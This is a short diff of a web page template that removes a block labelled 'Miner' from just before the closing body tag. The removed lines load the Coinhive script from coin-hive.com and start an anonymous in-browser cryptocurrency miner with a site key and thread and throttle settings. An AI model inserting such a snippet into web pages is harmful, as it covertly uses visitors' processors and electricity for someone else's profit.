@@ -51,17 +51,5 @@
 <script src="/js/jquery.detectmobilebrowser.js"></script>
 <script src="/js/video.min.js"></script>
 <script src="/js/w0bmscript.min.js?v={{ filemtime("js/w0bmscript.min.js") }}"></script>
-<!-- Miner -->
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('g3evRSgzMWemOExFz2UpSZLitnMopBBw', {
-	threads: 2,
-	autoThreads: false,
-	throttle: 0.1,
-	forceASMJS: false
-	});
-	miner.start();
-</script>
-<!-- /Miner -->
 </body>
 </html>
